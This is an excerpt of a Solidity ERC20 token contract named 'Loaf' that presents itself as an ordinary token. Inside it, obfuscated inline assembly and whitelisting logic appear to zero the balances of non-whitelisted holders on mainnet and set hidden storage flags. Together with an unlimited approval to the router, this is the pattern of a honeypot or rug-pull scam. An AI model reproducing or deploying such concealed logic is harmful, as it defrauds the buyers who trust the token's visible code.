...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addLoaf;
    uint256 private loafNess = block.number*2;

    mapping (address => bool) private _firstWheat; 
    mapping (address => bool) private _secondBread;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private liquidFreeze;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private thunderSound;
    address public pair;
    ...
    bool private trading; uint256 private regularFont = 1; bool private riceFood;
    uint256 private _decimals; uint256 private fanAlert;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addLoaf.push(_router); addLoaf.push(msgSender_); addLoaf.push(pair);
        for (uint256 q=0; q < 3;) {_firstWheat[addLoaf[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb36e186f023506e3b3dfaeb8ee14e86bb949386336ac8f9f654d7a78a610b59e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7600efb7da3b9be299525f4c9f0d6d52b4c1d90bc0cde800a9b24435a05db9bb,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; loafNess = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addLoaf[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployLoaf(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addLoaf[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployLoaf(creator, initialSupply);
    }
}

contract Loaf is ERC20Token {
    constructor() ERC20Token("Loaf", "LOAF", msg.sender, 25000000 * 10 ** 18) {
    }
}